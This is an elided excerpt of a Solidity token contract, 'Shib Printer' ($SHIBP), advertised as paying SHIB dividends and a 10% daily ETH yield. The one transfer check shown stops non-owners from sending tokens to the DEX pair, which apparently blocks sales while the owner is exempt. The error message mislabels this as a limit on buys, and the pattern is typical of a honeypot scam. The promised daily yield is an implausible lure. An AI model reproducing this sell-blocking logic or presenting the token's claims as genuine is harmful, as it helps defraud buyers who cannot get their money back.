...
Shib Printer
$SHIBP
Earn automatic SHIB dividends in combination with a daily high yield ETH interest payment (10%) based on your SHIBP holdings.
*/
...
contract ShibPrinter is Context, IERC20, Ownable {
   ...
   constructor(address _wallet1) {
    ...
    function _transfer(
        ...
        if (!_limitedbuys && sender != owner() && recipient != owner()) {
            require(recipient != dexPair, " Buys are limited");
        }
